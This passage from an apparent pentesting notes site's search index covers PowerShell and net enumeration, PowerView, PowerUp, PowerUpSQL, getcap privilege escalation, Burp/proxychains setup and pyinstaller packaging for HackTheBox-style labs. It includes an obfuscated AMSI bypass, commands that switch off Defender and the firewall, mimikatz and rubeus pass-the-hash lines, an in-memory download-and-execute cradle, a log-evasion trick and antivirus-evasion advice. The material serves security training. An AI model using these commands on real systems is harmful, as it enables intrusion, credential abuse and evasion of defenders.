PowerView.ps1\n# alias: `iwr`, `curl`, and `wget`\n</code></pre>"},{"location":"powershell/#basic-commands-for-reconnaissance-and-enumeration","title":"Basic commands for reconnaissance and enumeration","text":""},{"location":"powershell/#system-users-permissions","title":"System, users, permissions","text":"<pre><code># Prints all the information about the system\nsysteminfo\n\n# Prints the PC's Name\nhostname\n\n# Am I alone\nqwinsta\n\n# Display Powershell relevant Powershell version information\necho $PSVersion\necho ~PSVersionTable\n\n# Prints out the OS version and revision level\n[System.Environment]::OSVersion.Version \n\n# Prints the patches and hotfixes applied to the host\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Displays a list of environment variables for the current session (ran from CMD-prompt)\nset \n\n# Return environment values such as key paths, users, computer information, etc.\nGet-ChildItem Env: | ft Key,Value   \n\n# Displays the domain name to which the host belongs (ran from CMD-prompt)\necho %USERDOMAIN%   \n\n# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)\necho %logonserver%  \n\n#You can tell if PowerShell is running with administrator privileges (a.k.a \u201celevated\u201d rights) with the following snippet:\n[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'\n\n# Retrieves the WindowsIdentity for the currently running user.\n[Security.Principal.WindowsIdentity]::GetCurrent() \n\n# Access the groups property of the identity to find out what user groups the identity is a member of.\n[Security.Principal.WindowsIdentity]::GetCurrent()(...).groups\n\n# It returns true if groups contains the Well Known SID of the Administrators group (the identity will only contain it if \u201crun as administrator\u201d was used) and otherwise false.\n[Security.Principal.WindowsIdentity]::GetCurrent() -contains \"S-1-5-32-544\" \n\n# List disabled users with LDAP\nGet-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name\n</code></pre>"},{"location":"powershell/#processes","title":"Processes","text":"<pre><code># List which processes are elevated:\nGet-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated\n\n# List installed software on a computer\nget-ciminstance win32_product | fl\n</code></pre>"},{"location":"powershell/#run-a-utility-as-another-user","title":"Run a utility as another user","text":"<pre><code># Run an utility as another user with rubeus. Passing clear text credentials\nrubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94\n\n# Run an utility as another user with mimikatz.exe. Passing clear text credentials\nmimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94\n</code></pre>"},{"location":"powershell/#policies-and-antivirus","title":"Policies and antivirus","text":"<pre><code># Lists available modules loaded for use.\nGet-Module  \n\n#  print the execution policy settings for each scope on a host.\nGet-ExecutionPolicy -List   \n\n#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.\nSet-ExecutionPolicy Bypass -Scope Process   \n</code></pre> <p>AppLocker\u00a0is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.</p> <pre><code># Enumerate AppLocker policies \nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n# If we find that a file cannot be run from a location, maybe we can try to run it from another location.\n\n# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.\n$ExecutionContext.SessionState.LanguageMode\n\n# Check current execution policy. If the answer is\n# - \"Restricted\": Ps scripts cannot run.\n# - \"RemoteSigned\": Downloaded scripts will require the script to be signed by a trusted publisher.\nGet-Execution-Policy\n\n# Bypass execution policy\npowershell -ep bypass\n\n# Get the current Defender status.\nGet-MpComputerStatus\n\n# Deactivate antivirus from powershell session (if user has rights to do so)\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n# Disable firewall\nnetsh advfirewall set allprofiles state off\n\n# Bypass AMSI\n**S`eT-It`em ( 'V'+'aR' +\u00a0 'IA' + ('blE:1'+'q2')\u00a0 + ('uZ'+'x')\u00a0 ) ( [TYpE](\u00a0 \"{1}{0}\"-F'F','rE'\u00a0 ) )\u00a0 ;\u00a0 \u00a0 (\u00a0 \u00a0 Get-varI`A`BLE\u00a0 ( ('1Q'+'2U')\u00a0 +'zX'\u00a0 )\u00a0 -VaL\u00a0 ).\"A`ss`Embly\".\"GET`TY`Pe\"((\u00a0 \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')\u00a0 ) ).\"g`etf`iElD\"(\u00a0 ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')\u00a0 ),(\u00a0 \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'\u00a0 )).\"sE`T`VaLUE\"(\u00a0 ${n`ULl},${t`RuE} )**\n\n# Add a registry\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre>"},{"location":"powershell/#connect-to-a-share","title":"Connect to a share","text":"<pre><code># The command New-PSDrive connects a computer to or disconnects a computer from a shared resource or displays information about computer connections.\nNew-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\"\n\n# Connect/ Disconnect a share with user and password\n$username = 'plaintext'\n$password = 'Password123'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\" -Credential $cred\n</code></pre>"},{"location":"powershell/#transfer-files","title":"Transfer files","text":"<pre><code># This is a quick and easy way to download a file from the web using PowerShell and call it from memory.\npowershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"    \n</code></pre>"},{"location":"powershell/#network-information","title":"Network Information","text":"<pre><code># Lists all known hosts stored in the arp table.\narp -a\n\n# Prints out adapter settings for the host. We can figure out the network segment from here.\nipconfig /all   \n\n# Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.\nroute print\n\n# Displays the status of the host's firewall. We can determine if it is active and filtering traffic.\nnetsh advfirewall show allprofiles\n</code></pre>"},{"location":"powershell/#the-net-commands","title":"The net commands","text":"<p>Evasion trick: If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing\u00a0<code>net1</code>\u00a0instead of\u00a0<code>net</code>\u00a0will execute the same functions without the potential trigger from the net string.</p>"},{"location":"powershell/#netexe-commands","title":"Net.exe commands","text":"<pre><code># Information about password requirements\nnet accounts    \n\n# Password and lockout policy\nnet accounts /domain\n\n# Information about domain groups\nnet group /domain   \n\n# List users with domain admin privileges\nnet group \"Domain Admins\" /domain\n\n# List of PCs connected to the domain\nnet group \"domain computers\" /domain    \n\n# List PC accounts of domains controllers\nnet group \"Domain Controllers\" /domain  \n\n# User that belongs to the group\nnet group &lt;domain_group_name&gt; /domain   \n\n# List of domain groups\nnet groups /domain  \n\n# All available groups\nnet localgroup  \n\n# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)\nnet localgroup administrators /domain   \n\n# Information about a group (admins)\nnet localgroup Administrators   \n\n# Add user to administrators\nnet localgroup administrators [username] /add   \n\n# Check current shares\nnet share   \n\n# Get information about a user within the domain\nnet user &lt;ACCOUNT_NAME&gt; /domain \n\n# List all users of the domain\nnet user /domain    \n\n# Information about the current user\nnet user %username% \n\n# Mount the share locally\nnet use x: \\computer\\share  \n\n# Get a list of computers\nnet view    \n\n#   Shares on the domains\nnet view /all /domain[:domainname]\n\n# List shares of a computer\nnet view \\computer /ALL \n\n# List of PCs of the domain\nnet view /domain    \n</code></pre>"},{"location":"powershell/#advance-queries-in-powershell","title":"Advance queries in Powershell","text":"<p>The four types of Wildcards in powershell:</p> <p>The * wildcard will match zero or more characters  </p> <p>The ? wildcard will match a single character</p> <p>[m-n] Match a range of characters from m to n, so [f-m]ake will match fake/jake/make</p> <p>[abc] Match a set of characters a,b,c.., so [fm]ake will match fake/make</p>"},{"location":"powershell/#filters","title":"Filters","text":"<p>Filters are a way to power up our queries in powershell.</p> <p>Example: We can use the Filter parameter with the notlike operator to filter out all Microsoft software (which may be useful when enumerating a system for local privilege escalation vectors).</p> <pre><code>get-ciminstance win32_product -Filter \"NOT Vendor like '%Microsoft%'\" | fl\n</code></pre> <p>The Filter operator requires at least one operator:</p> Filter Meaning -eq Equal to -le Less than or equal to -ge Greater than or equal to -ne Not equal to -lt Less than -gt Greater than -approx -bor Bitwise OR -band Bitwise AND -recursivematch Recursive match -like Like -notlike Not like -and Boolean AND -or Boolean OR -not Boolean NOT <p>When using filters, certain characters must be escaped:</p> Character Escaped As Note \u201c `\u201d Only needed if the data is enclosed in double-quotes. \u2018 \\\u2019 Only needed if the data is enclosed in single quotes. NULL \\00 Standard LDAP escape sequence. \\ \\5c Standard LDAP escape sequence. * \\2a Escaped automatically, but only in -eq and -ne comparisons. Use -like and - notlike operators for wildcard comparison. ( /28 Escaped automatically. ) /29 Escaped automatically. / /2f Escaped automatically."},{"location":"powershell/#filter-examples-ad-object-properties","title":"Filter Examples: AD Object Properties","text":"<p>The filter can be used with operators to compare, exclude, search for, etc., a variety of AD object properties. Filters can be wrapped in curly braces, single quotes, parentheses, or double-quotes. For example, the following simple search filter using <code>Get-ADUser</code> to find information about the user \"Sally Jones\" can be written as follows:</p> <pre><code>Get-ADUser Filter \"name -eq 'sally jones'\"\nGet-ADUser -Filter {name -eq 'sally jones'}\nGet-ADUser -Filter 'name -eq \"sally jones\"'\n</code></pre> <p>As seen above, the property value (here, <code>sally jones</code>) can be wrapped in single or double-quotes.</p> <pre><code># The asterisk (`*`) can be used as a wildcard when performing queries. \nGet-ADUser -filter {-name -like \"joe*\"}\n# it return all domain users whose name start with `joe` (joe, joel, etc.).\n</code></pre>"},{"location":"powershell/#disk-management","title":"Disk Management","text":"<pre><code># Show disks\nGet-Disk\n\n# Show disks in a more humanly mode\nGet-disk | FT -AutoSize\n\n# Show partitions from a disk\nGet-Partition -DiskNumber 1\n\n# Create partition\nNew-Partition -DiskNumber 1 -Size 50GB -AssignDriveLetter\n\n# Show volume\nGet-volume -DriveLetter e\n\n# Format Disk and assign file system\nFormat-volume -DriveLetter E -FileSystem NTFS\n\n# Delete Partition \nRemove-Partition -DriveLetter E\n</code></pre>"},{"location":"powershell/#disk-management-with-diskpart","title":"Disk Management with diskpart","text":"<p>Diskpart is a command interpreter that helps you manage your computer's drivers. How it works? Before using diskpart commands, you usually have to list and select the object you want to operate on.</p> <pre><code># To enter in diskpart command interpreter\ndiskpart\n\n# Enumerate disk\nlist disk\n\n# Select disk\nselect disk 0\n\n# Enumerate volumes\nlist volume\n\n# Select volume\nselect volume 1\n\n# Enumerate partitions\nlist partition\n\n# Select partition\nselect partition 2\n\n# Extend a volume (once you have it selected)\nextend size=2048\n\n# Shring a volume (once you have it selected)\nshrink desired=2048\n</code></pre>"},{"location":"powershell/#howtos","title":"Howtos","text":""},{"location":"powershell/#how-to-delete-shortcuts-from-public-desktop","title":"How to delete shortcuts from Public Desktop","text":"<pre><code># Instead of \"everyone\" set the group that you prefer\n$acl = Get-ACL \u201cC:\\Users\\Public\\Desktop\u201d\n\n$rule=new-object System.Security.AccessControl.FileSystemAccessRule (\u201ceveryone\u201d,\u201dFullControl\u201d, \u201cContainerInherit,ObjectInherit\u201d, \u201cNone\u201d, \u201cAllow\u201d)\n\n$acl.SetAccessRule($rule)\n\nSet-ACL \u201cC:\\Users\\Public\\Desktop\u201d $acl\n</code></pre>"},{"location":"powershell/#how-to-uninstall-winzip-from-powershell-line-of-command","title":"How to uninstall winzip from powershell line of command","text":"<pre><code># Show all software installed:\nGet-WmiObject\u00a0-Class\u00a0win32_product\n\n# Find winzip object\nGet-WmiObject\u00a0-Class\u00a0win32_product |\u00a0where\u00a0{\u00a0$_.Name\u00a0-like\u00a0\"*Winzip*\"}\n\n# Create a variable for  the object\n$wzip\u00a0=\u00a0Get-WmiObject\u00a0-Class\u00a0win32_product |\u00a0where\u00a0{\u00a0$_.Name\u00a0-like\u00a0\"*Winzip*\"}\n\n# Uninstall it:\nmsiexec /x\u00a0\u00a0$wzip.localpackage /passive\n</code></pre> <p>This will start un-installation of Winzip and will show only the Progress bar only {because we are using msiexex\u2019s /passive switch\u201d</p>"},{"location":"powerup/","title":"PowerUp.ps1","text":"<p>Run from powershell.</p>","tags":["active directory","ldap","windows","privilege escalation","tools"]},{"location":"powerup/#installation","title":"Installation","text":"<p>Download from PowerSploit Github repo: https://github.com/ZeroDayLab/PowerSploit.</p> <pre><code>Import-Module .\\PowerUp.ps1\n</code></pre>","tags":["active directory","ldap","windows","privilege escalation","tools"]},{"location":"powerup/#basic-commands","title":"Basic commands","text":"<pre><code># Find services vulnerables in my machine\nInvoke-AllChecks\n\n# Exploit a vulnerable service to escalate to the more privilege user that runs that service\nInvoke-ServiceAbuse -Name \u2018&lt;NAME OF THE SERVICE&gt;\u2019 -UserName \u2018&lt;DOMAIN CONTROLLER&gt;\\&lt;MY CURRENT USERNAME&gt;\u2019\n</code></pre>","tags":["active directory","ldap","windows","privilege escalation","tools"]},{"location":"powerupsql/","title":"PowerUpSQL","text":"<p>PowerUpSQL includes functions that support SQL Server discovery, weak configuration auditing, privilege escalation on scale, and post exploitation actions such as OS command execution. It is intended to be used during internal penetration tests and red team engagements. However, PowerUpSQL also includes many functions that can be used by administrators to quickly inventory the SQL Servers in their ADS domain and perform common threat hunting tasks related to SQL Server.</p>","tags":["active","directory","tools"]},{"location":"powerupsql/#installation","title":"Installation","text":"<p>Github repo: https://github.com/NetSPI/PowerUpSQL.</p>","tags":["active","directory","tools"]},{"location":"powerupsql/#basic-commands","title":"Basic commands","text":"<p>Cheat sheets: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</p> <p>Authenticate against the remote SQL server host and run custom queries or operating system commands.</p> <p><pre><code>Get-SQLQuery -Verbose -Instance \"$ipHost,$port\" -username \"$domain\\$userSamAccountName\" -password \"$password\" -query 'Select @@version'\n\n# Example:\n# Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n</code></pre> </p>","tags":["active","directory","tools"]},{"location":"powerview/","title":"Powerview.ps1","text":"<p>Run from powershell.</p> <p>Download from PowerSploit Github repo: https://github.com/ZeroDayLab/PowerSploit.</p> <pre><code>Import-Module .\\Powerview.ps1\u00a0\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"powerview/#enumeration-cheat-sheet","title":"Enumeration cheat sheet","text":"<p>Module: ActiveDirectory</p> <pre><code>########################\n# Domain/LDAP Functions\n########################\n\n# Returns the AD object for the current (or specified) domain\nGet-Domain  \n\n# Return a list of the Domain Controllers for the specified domain\nGet-DomainController    \n\n# Returns all users or specific user objects in AD\nGet-DomainUser  \n# Example: \n# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n\n# Checks for users with the SPN attribute set\nGet-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n\n# Returns all computers or specific computer objects in AD\nGet-DomainComputer  \n\n# Returns all groups or specific group objects in AD\nGet-DomainGroup \n\n# Searches for all or specific OU objects in AD\nGet-DomainOU\n\n# Finds object ACLs in the domain with modification rights set to non-built in objects\nFind-InterestingDomainAcl   \n\n# Returns the members of a specific domain group\nGet-DomainGroupMember   \n# Example: \n# Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) \n\n# Returns a list of servers likely functioning as file servers\nGet-DomainFileServer    \n\n# Returns a list of all distributed file systems for the current (or specified) domain\nGet-DomainDFSShare  \n\n\n########################\n# GPO Functions\n########################\n# Returns all GPOs or specific GPO objects in AD\nGet-DomainGPO   \n\n# Returns the default domain policy or the domain controller policy for the current domain\nGet-DomainPolicy    \n\n\n########################\n# Computer Enumeration Functions\n########################\n# Enumerates local groups on the local or a remote machine\nGet-NetLocalGroup\n\n# Enumerates members of a specific local group\nGet-NetLocalGroupMember \n\n# Returns open shares on the local (or a remote) machine\nGet-NetShare    \n\n# Returns session information for the local (or a remote) machine\nGet-NetSession  \n\n# Tests if the current user has administrative access to the local (or a remote) machine\nTest-AdminAccess    \n# Example: \n# Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n\n\n########################\n# Threaded 'Meta'-Functions:\n########################\n# Finds machines where specific users are logged in\nFind-DomainUserLocation \n\n# Finds reachable shares on domain machines\nFind-DomainShare    \n\n# Searches for files matching specific criteria on readable shares in the domain\nFind-InterestingDomainShareFile \n\n# Finds machines on the local domain where the current user has local administrator access\nFind-LocalAdminAccess   \n\n\n########################\n# Domain Trust Functions:\n########################\n# Returns domain trusts for the current domain or a specified domain\nGet-DomainTrust \n\n# Returns all forest trusts for the current forest or a specified forest\nGet-ForestTrust \n\n# Enumerates users who are in groups outside of the user's domain\nGet-DomainForeignUser   \n\n# Enumerates groups with users outside of the group's domain and returns each foreign member\nGet-DomainForeignGroupMember    \n\n# Enumerates all trusts for the current domain and any others seen.\nGet-DomainTrustMapping  \n</code></pre> <pre><code># Gets the ID for the current Domain (useful later for crafting Golden tickets)\nGet-DomainID\n\n# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts\nGet-DomainPolicy\n\n# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account\nGet-DomainSPNTicket\n</code></pre> <p>Module: <code>NetShare</code> (or related networking modules)</p> <pre><code># Enumerates users\nGet-NetUser\n\n# Enumerates computers in the domain\nGet-NetComputer \nGet-NetComputer | select name\nGet-NetComputer -OperatingSystem \"Linux\"\n\n# Displays info of current domain. Pay attention to the element forest, to see if there is a bigger structure\nGet-NetDomain\n\n# Gets the ID for the current Domain (useful later for crafting Golden tickets)\nGet-DomainID\n\n# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts\nGet-DomainPolicy\n\n# Displays Domain controller\nGet-NetDomainController\n\n# Lists users in the domain. Useful to search for non expiring passwords, groups belonging, what's their SPN, last time they changed their password... \nGet Net-User\nGet Net-User john.doe\n\n# Lists users associated to an Service Principal Name (SPN) \nGet Net-User -SPN\n\n# Lists groups in the domain\nGet-NetGroup\n\n# Lists Group Policy Objects in domain\nGet-NetGPO\n\n# Lists Domain Trusts\nGet-NetDomainTrust\n\n\n# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account\nGet-DomainSPNTicket\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"process-capabilities-getcap/","title":"Process capabilities: getcap","text":"<p>Linux capabilities provide a subset of the available root privileges to a process. For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).</p> <p>In Linux, files may be given specific capabilities. For example, if an executable needs to access (read) files that are only readable by root, it is possible to give that file this \u2018permission\u2019 without having it run with complete root privileges. This allows for a more secure system in general.</p> <p>getcap and setcap are used to view and set capabilities, respectively. They usually belong to the libcap2-bin package on debian and debian-based distributions.</p> <p>Scan all files in system and check capabilities:</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre> <p>Check what every capability means in https://linux.die.net/man/7/capabilities</p> <p>Knowing what capability is assigned to a proccess, try to make the best of it to escalate privileges. </p> <p>Example in HackTheBox: nunchucks in which perl command has \" cap_setuid+ep\" capabilities, which means that at some point may run as sudo.</p>","tags":["privilege escalation","linux"]},{"location":"process-capabilities-getcap/#labs","title":"Labs","text":"<p>HackTheBox: nunchucks</p>","tags":["privilege escalation","linux"]},{"location":"process-capabilities-getcap/#resources","title":"Resources","text":"<p>Hacktricks</p> <p>https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/</p>","tags":["privilege escalation","linux"]},{"location":"process-hacker-tool/","title":"Process Hacker tool","text":"","tags":["thick client application"]},{"location":"process-hacker-tool/#usage","title":"Usage","text":"<p>In the course Pentesting thick clients applications.</p> <p>We will be using the portable version.</p> <p>1. Open the application you want to test.</p> <p>2. Open Process Hacker Tool.</p> <p>3. Select the application, click right on \"Properties\".</p> <p>4. Select tab \"Memory\".</p> <p>5. Click on \"Strings\".</p> <p></p> <p>6. Check \"Image\" and \"Mapped\" and search!</p> <p></p> <p>7. In the results you can use the Filter option to search for (in this case) \"data source\". </p> <p></p> <p>Other possible searches: Decrypt. Clear text conection string in memory reveals credentials: powned!!!</p>","tags":["thick client application"]},{"location":"proxies/","title":"Proxies","text":"<p>A proxy is when a device or service sits in the middle of a connection and acts as a mediator.</p> <ul> <li>HTTP Proxies: BurpSuite</li> <li>Postman, mitm_relay</li> <li>SOCKS/SSH Proxy (for pivoting): Chisel, ptunnel, sshuttle.</li> </ul> <p>There are many types of proxy services, but the key ones are:</p> <ul> <li>Dedicated Proxy<code>/</code>Forward Proxy: The Forward Proxy, is what most people imagine a proxy to be. A Forward Proxy is when a client makes a request to a computer, and that computer carries out the request. For example, in a corporate network, sensitive computers may not have direct access to the Internet. To access a website, they must go through a proxy (or web filter).</li> <li>Reverse Proxy: As you may have guessed, a reverse proxy, is the reverse of a Forward Proxy. Instead of being designed to filter outgoing requests, it filters incoming ones. The most common goal with a Reverse Proxy, is to listen on an address and forward it to a closed-off network. Many organizations use CloudFlare as they have a robust network that can withstand most DDOS Attacks.</li> <li>Transparent Proxy</li> </ul>"},{"location":"proxies/#setting-up-proxychains-with-burpsuite","title":"Setting up Proxychains with BurpSuite","text":"<p>Using Proxychains to redirect traffic from an app to Burpsuite:</p> <pre><code># Checks installation\nwhich proxychains\n\n# Configuration file\n/etc/proxychains4.conf\n\n# To use\u00a0`proxychains`, we first have to edit\u00a0`/etc/proxychains.conf`, comment out the final line and add the following line at the end of it:\n#socks4         127.0.0.1 9050\nhttp 127.0.0.1 8080\n\n# Enable quiet_mode by uncommenting and removing # \n</code></pre> <p>After this we can prepend <code>proxychains</code>to any command. The traffic of that command should be routed through proxychains. For example:</p> <pre><code>proxychains curl http://example.com\n</code></pre> <p>This request will be addressed to Burpsuite tool.</p>"},{"location":"proxies/#routing-nmap-through-burpsuite","title":"Routing nmap through Burpsuite","text":"<pre><code>nmap --proxies http://127.0.0.1:8080 $ip -p $port -Pn -sC\n</code></pre> <p>Go to Burpsuite proxy tool to see all requests made by nmap in the proxy history.</p> <pre><code>Note: Nmap's built-in proxy is still in its experimental phase, as mentioned by its manual (`man nmap`), so not all functions or traffic may be routed through the proxy. In these cases, we can simply resort to\u00a0`proxychains`, as we did earlier.\n</code></pre>"},{"location":"proxies/#setting-up-postman-with-burpsuite","title":"Setting up Postman with BurpSuite","text":"<p>1 - Postman &gt; Settings </p> <p></p> <p>2 - Proxy tab. Check: </p> <ul> <li>Use the system proxy</li> <li>Add a custom proxy configuration </li> <li>HTTP </li> <li>HTTPS </li> <li>127.0.0.1</li> <li>8080</li> </ul> <p></p> <p>3 -  BurpSuite. Settup proxy listener</p> <p></p> <p>4 - Burp Suite. Intercept mode on</p> <p></p> <p>5 - Postman. Send the interesting request from your collection</p> <p></p> <p>6 - Your BurpSuite will intercept that traffic. Now you can send it to Intruder, Repeater, Sequencer...</p> <p></p>"},{"location":"proxies/#setting-up-mitm_relay-with-burpsuite","title":"Setting up mitm_relay with Burpsuite","text":"<p>In DVTA we will configure the server to the IP of the local machine. In my lab set up my IP was 10.0.2.15.</p> <p>In FTP, we will configure the listening port to 2111. Also we will disable IP check for this lab setup to work.</p> <p>From https://github.com/jrmdev/mitm_relay:</p> <p></p> <p>This is what we're doing:</p> <p></p> <p>1. DVTA application sends traffic to port 21, so to intercept it we configure MITM_relay to be listening on port 21.</p> <p>2. mitm_relay encapsulates the application traffic )no matter the protocol, into HTTP protocol so BurpSuite can read it</p> <p>3. Burp Suite will read the traffic. And we can tamper here our code.</p> <p>4. mitm_relay will \"unfunnel\" the traffic from the HTPP protocol into the raw one</p> <p>5. In a lab setup FTP server will be in the same network, so to not get in conflict with mitm_relay we will modify FTP listen port to 2111. In real life this change is not necessary</p> <p>Running mitm_relay:</p> <pre><code>python mitm_relay.py -l 0.0.0.0 -r tcp:21:10.0.2.15:2111 -p 127.0.0.1:8080\n# -l listening address for mitm_relay (0.0.0.0 means we all listening in all interfaces)\n# -r relay configuration: &lt;protocol&gt;:&lt;listeningPort&gt;:&lt;IPofDestinationserver&gt;:&lt;listeningPortonDestinationServer&gt;\n# -p Proxy configuration: &lt;IPofProxy&gt;:&lt;portOfProxy&gt; \n</code></pre> <p></p> <p>And this is how the interception looks like:</p> <p></p>"},{"location":"proxies/#burpsuite-sqlmap","title":"Burpsuite +  sqlmap","text":""},{"location":"proxies/#from-burpsuite","title":"From Burpsuite","text":"<p>Browse the application to capture the generating csfr request in your traffic.</p> <p></p> <p>Open Settings, go to tab Session and scroll down to the section Macros. </p> <p>Click on \"Add\" (a macro.) You will see the already captured requests. </p> <p>Select the request in which the csrt is created/refreshed (and still not used) and click on OK.</p> <p>Name your macro in the window \"Macro Editor,\" for instance GET_csrf, and select \"Configure item\". </p> <p>Now you indicate to Burpsuite where the value of the CSRF is shown in the response. Don't forget to add the name of the parameter. Click on OK.</p> <p>Click on OK in the window \"Macro editor\".</p> <p></p> <p>You are again in the Setting&gt;Sessions section. Macro section is at the bottom of the page. Now we are going to configure the section \"Session handling rules\":</p> <p>Click on \"Add\" (a rule,) and the \"Session handling rule editor\" will open.</p> <ul> <li>In Rule description write: PUT_CSRF</li> <li>In Rule actions, click on \"Add &gt; Run a macro.\" </li> <li>New window will open for defining the action performed by the macro:<ul> <li>Select the macro GET_csrf.</li> <li>Select the option \"Update only the following parameter,\" and add in there the name we used before when defining where the token was, \"csrf.\"</li> <li>In the top menu, select the tab \"Scope,\" and add the url within scope. </li> <li>IMPORTANT: In Tools Scope, select the module \"Proxy.\" This will allow  sqlmap request to be routed.</li> </ul> </li> </ul>"},{"location":"proxies/#from-sqlmap","title":"From Sqlmap","text":"<p>Create a file that contains the request that is vulnerable to SQLi and save it.</p> <p>Then:</p> <pre><code>sqlmap -r request.txt -p id --proxy=http://localhost:8080 --current-db --flush sessions -vv \n</code></pre> <p>Important: Flag --proxy sends the request via Burpsuite.</p> <p>For Blind injections you need to specify other parameters such as risk and level.</p>"},{"location":"proxies/#metasploit","title":"Metasploit","text":"<p>To proxy web traffic made by Metasploit modules to better investigate and debug them:</p> <pre><code># Start metasploit\nmsfconsole -q\n\n# Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES`\u00a0flag. \nset PROXIES HTTP:127.0.0.1:8080\n</code></pre> <p>With this, all the traffic of metasploit to the server will be proxied via Burpsuite.</p>"},{"location":"proxychains/","title":"proxychains","text":"<p>ProxyChains is a UNIX program, that hooks network-related libc functions in dynamically linked programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or HTTP proxies. Documentation.</p>","tags":["web","pentesting","proxy","tools"]},{"location":"proxychains/#basic-usage","title":"Basic usage","text":"<pre><code># Checks installation\nwhich proxychains\n\n# Configuration file\n/etc/proxychains4.conf\n\n# To use\u00a0`proxychains`, we first have to edit\u00a0`/etc/proxychains.conf`, comment out the final line and add the following line at the end of it:\n#socks4         127.0.0.1 9050\nhttp 127.0.0.1 8080\n\n# Enable quiet_mode by uncommenting and removing # \n</code></pre> <p>After this we can prepend <code>proxychains</code>to any command. The traffic of that command should be routed through proxychains. For example:</p> <pre><code>proxychains curl http://example.com\n</code></pre> <p>This request will be addressed to Burpsuite tool.</p> <p>With proxychains you can use more services. For instance, xfreerdp:</p> <pre><code>proxychains xfreerdp /v:$ip /u:$username /p:$password\n</code></pre>","tags":["web","pentesting","proxy","tools"]},{"location":"pyftpdlib/","title":"pyftpdlib","text":"<p>A simple FTP server written in python</p>","tags":["pentesting","windows","ftp server","python"]},{"location":"pyftpdlib/#installation","title":"Installation","text":"<pre><code>sudo pip3 install pyftpdlib\n</code></pre>","tags":["pentesting","windows","ftp server","python"]},{"location":"pyftpdlib/#basic-usage","title":"Basic usage","text":"<p>By default pyftpdlib uses port 2121. With --port flag, indicate a different port. Anonymous authentication is enabled by default if we don't set a user and password.</p> <pre><code>sudo python3 -m pyftpdlib --port 21\n</code></pre> <p>With the option <code>--write</code> to allow clients to upload files to our attack host:</p> <pre><code>sudo python3 -m pyftpdlib --port 21 --write\n</code></pre>","tags":["pentesting","windows","ftp server","python"]},{"location":"pyinstaller/","title":"Pyinstaller","text":"<p>PyInstaller reads a Python script written by you. It analyzes your code to discover every other module and library your script needs in order to execute. Then it collects copies of all those files \u2013 including the active Python interpreter! \u2013 and puts them with your script in a single folder, or optionally in a single executable file.</p>","tags":["pentesting","python"]},{"location":"pyinstaller/#installation","title":"Installation","text":"<pre><code>pip install pyinstaller\n</code></pre>","tags":["pentesting","python"]},{"location":"pyinstaller/#usage","title":"Usage","text":"<pre><code>pyinstaller /path/to/yourscript.py\n</code></pre> <p>But the real power of pyinstaller is when it comes to onefile script generation. Additionally, pyinstaller provides a flag to avoid consoles from opening.</p> <pre><code>pyinstaller --onefile --windowed /path/to/yourscript.py\n</code></pre> <p>IF\u00a0the antivirus (signature based) is able to catch the EXE even before opening it, then you need to change the packaging method as that would change the signature of the exported EXE. </p> <p>Pyinstaller uses UPX\u00a0to compress the size of the EXE output. So it's worth to try with</p> <pre><code>pyinstaller --onefile --windowed 